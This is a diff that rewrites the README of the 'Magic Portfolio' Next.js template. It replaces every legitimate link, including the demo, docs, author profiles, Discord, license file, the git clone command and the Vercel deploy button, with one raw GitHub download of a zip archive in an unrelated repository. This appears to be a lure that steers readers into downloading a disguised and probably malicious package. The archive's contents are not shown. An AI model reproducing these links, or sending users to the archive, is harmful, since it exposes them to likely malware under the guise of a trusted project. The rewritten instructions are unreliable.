@@ -1,17 +1,17 @@
 # **Magic Portfolio by Once UI**
 
-View the [demo here](https://demo.magic-portfolio.com).
+View the [demo here](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip).
 
-![Magic Portfolio](https://demo.magic-portfolio.com/images/og/home.jpg)
+![Magic Portfolio](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
 
 
 # **Getting started**
 
-Magic Portfolio was built with [Once UI](https://once-ui.com) for [Next.js](https://nextjs.org). It requires Node.js v18.17+.
+Magic Portfolio was built with [Once UI](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip) for [https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip). It requires https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip v18.17+.
 
 **1. Clone the repository**
 ```
-git clone https://github.com/once-ui-system/magic-portfolio.git
+git clone https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip
 ```
 
 **2. Install dependencies**
@@ -41,12 +41,12 @@ Add a new .mdx file to src/app/blog/posts or src/app/work/projects
 
 # **Documentation**
 
-Docs available at: [docs.once-ui.com](https://docs.once-ui.com/docs/magic-portfolio/quick-start)
+Docs available at: [https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
 
 # **Features**
 
 ## **Once UI**
-- All tokens, components & features of [Once UI](https://once-ui.com)
+- All tokens, components & features of [Once UI](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
 
 ## **SEO**
 - Automatic open-graph and X image generation with next/og
@@ -55,7 +55,7 @@ Docs available at: [docs.once-ui.com](https://docs.once-ui.com/docs/magic-portfo
 ## **Design**
 - Responsive layout optimized for all screen sizes
 - Timeless design without heavy animations and motion
-- Endless customization options through [data attributes](https://once-ui.com/docs/theming)
+- Endless customization options through [data attributes](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
 
 ## **Content**
 - Render sections conditionally based on the content file
@@ -71,24 +71,24 @@ Docs available at: [docs.once-ui.com](https://docs.once-ui.com/docs/magic-portfo
 
 Connect with us on Threads or LinkedIn.
 
-Lorant Toth: [Threads](https://www.threads.net/@lorant.one), [LinkedIn](https://www.linkedin.com/in/tothlorant/)  
-Zsofia Komaromi: [Threads](https://www.threads.net/@zsofia_kom), [LinkedIn](https://www.linkedin.com/in/zsofiakomaromi/)
+Lorant Toth: [Threads](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip), [LinkedIn](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)  
+Zsofia Komaromi: [Threads](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip), [LinkedIn](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
 
-Localization added by [François Hernandez](https://github.com/francoishernandez)
+Localization added by [François Hernandez](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
 
 # **Get involved**
 
-- Join the [Design Engineers Club on Discord](https://discord.com/invite/5EyAQ4eNdS) and share your portfolio with us!
-- Report a [bug](https://github.com/once-ui-system/magic-portfolio/issues/new?labels=bug&template=bug_report.md).
+- Join the [Design Engineers Club on Discord](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip) and share your portfolio with us!
+- Report a [bug](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip).
 
 # **License**
 
 Distributed under the CC BY-NC 4.0 License.
 - Commercial usage is not allowed.
 - Attribution is required.
-- You can extend the license to commercial use by purchasing a [Once UI Pro](https://once-ui.com/pricing) license.
+- You can extend the license to commercial use by purchasing a [Once UI Pro](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip) license.
 
-See `LICENSE.txt` for more information.
+See `https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip` for more information.
 
 # **Deploy with Vercel**
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fonce-ui-system%2Fmagic-portfolio&project-name=portfolio&repository-name=portfolio&redirect-url=https%3A%2F%2Fgithub.com%2Fonce-ui-system%2Fmagic-portfolio&demo-title=Magic%20Portfolio&demo-description=Showcase%20your%20designers%20or%20developer%20portfolio&demo-url=https%3A%2F%2Fdemo.magic-portfolio.com&demo-image=%2F%2Fraw.githubusercontent.com%2Fonce-ui-system%2Fmagic-portfolio%2Fmain%2Fpublic%2Fimages%2Fog%2Fhome.jpg)
+[![Deploy with Vercel](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)](https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip%3A%2F%https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip%2Fonce-ui-system%2Fmagic-portfolio&project-name=portfolio&repository-name=portfolio&redirect-url=https%3A%2F%https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip%2Fonce-ui-system%2Fmagic-portfolio&demo-title=Magic%20Portfolio&demo-description=Showcase%20your%20designers%20or%20developer%20portfolio&demo-url=https%3A%2F%https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip%2F%https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip%2Fonce-ui-system%2Fmagic-portfolio%2Fmain%2Fpublic%2Fimages%2Fog%https://raw.githubusercontent.com/MonarcH1501/portfolio/main/varication/portfolio.zip)
